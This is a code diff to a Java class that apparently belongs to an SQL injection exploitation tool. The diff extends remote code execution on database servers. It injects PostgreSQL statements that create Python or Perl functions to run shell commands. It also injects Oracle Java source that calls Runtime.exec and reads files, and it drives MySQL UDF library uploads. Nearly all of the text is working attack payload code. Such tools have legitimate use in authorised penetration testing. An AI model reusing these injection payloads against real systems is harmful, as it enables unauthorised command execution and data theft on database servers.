@@ -53,28 +53,48 @@ public class UdfAccess {
         this.injectionModel = injectionModel;
     }
 
-    public void createExploitRcePostgres(ExploitMethod exploitMethod) throws JSqlException {
-        if (!Arrays.asList(ExploitMethod.AUTO, ExploitMethod.QUERY_BODY).contains(exploitMethod)) {
-            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Exploit method not implemented, using query body instead");
+    public void createExploitRcePostgres(ExploitMode exploitMode) throws JSqlException {
+        if (!Arrays.asList(ExploitMode.AUTO, ExploitMode.QUERY_BODY).contains(exploitMode)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Exploit mode not implemented, using query body instead");
         }
 
-        this.injectionModel.injectWithoutIndex(";CREATE EXTENSION plpython3u;", "body#create-ext");
-        var languages = this.getResult(
-            "select array_to_string(array(select lanname FROM pg_language),'')",
-            "body#find-ext"
-        );
-        if (!languages.contains("plpython3u")) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: python extension not found");
-            return;
+        var nameExtension = this.createExtension("3u");
+        if (StringUtils.isEmpty(nameExtension)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Extension plpython3u not found, trying plpython2u instead");
+            nameExtension = this.createExtension("2u");
+            if (StringUtils.isEmpty(nameExtension)) {
+                LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Extension plpython2u not found, trying plpythonu instead");
+                nameExtension = this.createExtension("u");
+                if (StringUtils.isEmpty(nameExtension)) {
+                    LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Extension plpythonu not found, trying plperlu instead");
+                    nameExtension = "plperlu";
+                    this.injectionModel.injectWithoutIndex(";CREATE EXTENSION plperlu;", "body#add-ext");
+                    String languages = this.getResult(
+                        "select array_to_string(array(select lanname FROM pg_language),'')",
+                        "body#confirm-ext"
+                    );
+                    if (!languages.contains("plperlu")) {
+                        LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: extension not found");
+                        return;
+                    }
+                }
+            }
         }
 
-        this.injectionModel.injectWithoutIndex(String.join(
-            "%0a",
-            "; CREATE OR REPLACE FUNCTION exec_cmd(cmd TEXT) RETURNS text AS%20$$",
-            "from subprocess import check_output as c",
-            "return c(cmd).decode()",
-            "$$%20LANGUAGE plpython3u;"
-        ), "body#create-func");
+        if (nameExtension.startsWith("plpython")) {
+            this.injectionModel.injectWithoutIndex(String.join(
+                "%0a",
+                "; CREATE OR REPLACE FUNCTION exec_cmd(cmd TEXT) RETURNS text AS%20$$",
+                "from subprocess import check_output as c",
+                "return c(cmd).decode()",
+                "$$%20LANGUAGE "+ nameExtension +";"
+            ), "body#add-func");
+        } else {
+            this.injectionModel.injectWithoutIndex(
+                "; CREATE FUNCTION exec_cmd(text) RETURNS text AS 'return `$_[0]`' LANGUAGE plperlu;"
+            , "body#add-func");
+        }
+
         var functions = this.getResult(
             "SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' and routine_name = 'exec_cmd'",
             "body#find-func"
@@ -84,7 +104,7 @@ public class UdfAccess {
             return;
         }
 
-        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "RCE successful: python function found");
+        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "RCE successful: function found");
 
         var request = new Request();
         request.setMessage(Interaction.ADD_TAB_EXPLOIT_RCE_POSTGRES);
@@ -92,8 +112,20 @@ public class UdfAccess {
         this.injectionModel.sendToViews(request);
     }
 
-    public void createExploitRceOracle(ExploitMethod exploitMethod) throws JSqlException {
-        if (!Arrays.asList(ExploitMethod.AUTO, ExploitMethod.QUERY_BODY).contains(exploitMethod)) {
+    private String createExtension(String nameExtension) throws JSqlException {
+        this.injectionModel.injectWithoutIndex(";CREATE EXTENSION plpython"+ nameExtension +";", "body#add-ext");
+        String languages = this.getResult(
+            "select array_to_string(array(select lanname FROM pg_language),'')",
+            "body#confirm-ext"
+        );
+        if (languages.contains("plpython"+ nameExtension)) {
+            return "plpython"+ nameExtension;
+        }
+        return StringUtils.EMPTY;
+    }
+
+    public void createExploitRceOracle(ExploitMode exploitMode) throws JSqlException {
+        if (!Arrays.asList(ExploitMode.AUTO, ExploitMode.QUERY_BODY).contains(exploitMode)) {
             LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Exploit method not implemented, using query body instead");
         }
 
@@ -110,7 +142,7 @@ public class UdfAccess {
             "\" as import java.io.*; public class ", UdfAccess.RCE_JAVA_UTIL_SRC, "{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';",
             "\\n",
             "END;"
-        )), "body#create-src");
+        )), "body#add-src");
         this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
             UdfAccess.BEGIN,
             "\\n",
@@ -121,7 +153,7 @@ public class UdfAccess {
             ".runCmd(java.lang.String) return String'';';",
             "\\n",
             "END;"
-        )), "body#create-func");
+        )), "body#add-func");
         this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
             UdfAccess.BEGIN,
             "\\n",
@@ -149,7 +181,7 @@ public class UdfAccess {
         this.injectionModel.sendToViews(request);
     }
 
-    public void createUdf(String pathNetshareFolder, ExploitMethod exploitMethod) throws JSqlException {
+    public void createUdf(String pathNetshareFolder, ExploitMode exploitMode) throws JSqlException {
         if (this.injectionModel.getResourceAccess().isReadingNotAllowed()) {
             return;
         }
@@ -182,7 +214,7 @@ public class UdfAccess {
             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit UDF requires stack query, trying anyway...");
         }
         String isSuccess = StringUtils.EMPTY;
-        if (exploitMethod == ExploitMethod.NETSHARE) {
+        if (exploitMode == ExploitMode.NETSHARE) {
             if (!pathNetshareFolder.endsWith("\\")) {
                 pathNetshareFolder += "\\";
             }
@@ -194,7 +226,7 @@ public class UdfAccess {
                 pathPlugin,
                 this.biPredConfirm
             );
-        } else if (exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.QUERY_BODY) {
+        } else if (exploitMode == ExploitMode.AUTO || exploitMode == ExploitMode.QUERY_BODY) {
             if (StringUtil.GET.equals(this.injectionModel.getMediatorUtils().getConnectionUtil().getTypeRequest())) {
                 LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "GET too limited for UDF with body query, should use POST instead but using GET anyway...");
             }
@@ -206,7 +238,7 @@ public class UdfAccess {
                 this.biPredConfirm
             );
         }
-        if (StringUtils.isEmpty(isSuccess) && exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.TEMP_TABLE) {
+        if (StringUtils.isEmpty(isSuccess) && exploitMode == ExploitMode.AUTO || exploitMode == ExploitMode.TEMP_TABLE) {
             var nameLibraryRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameLibrary;
             this.byTable(UdfAccess.toHexChunks(nameLibrary), pathPlugin + nameLibraryRandom);
             this.biPredConfirm.test(pathPlugin, nameLibraryRandom);
